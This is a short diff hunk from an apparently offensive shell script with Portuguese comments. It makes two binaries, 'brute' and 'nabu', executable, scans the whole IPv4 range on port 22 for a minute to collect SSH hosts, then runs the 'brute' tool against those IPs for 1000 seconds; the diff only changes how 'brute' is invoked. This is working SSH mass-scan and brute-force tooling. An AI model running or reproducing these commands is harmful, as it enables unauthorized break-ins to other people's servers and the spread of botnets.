@@ -36,7 +36,7 @@ chmod +x brute nabu  || chmod 777 brute nabu
 timeout  60s     ./nabu  -p 22 -host  0.0.0.0/0   > ips     #60  segundos para  pega os ips
 
 
-timeout  1000s  sh -c  ./brute   #1000 segundos pra testa os ips
+timeout  1000s     ./brute   #1000 segundos pra testa os ips
 
 
 }
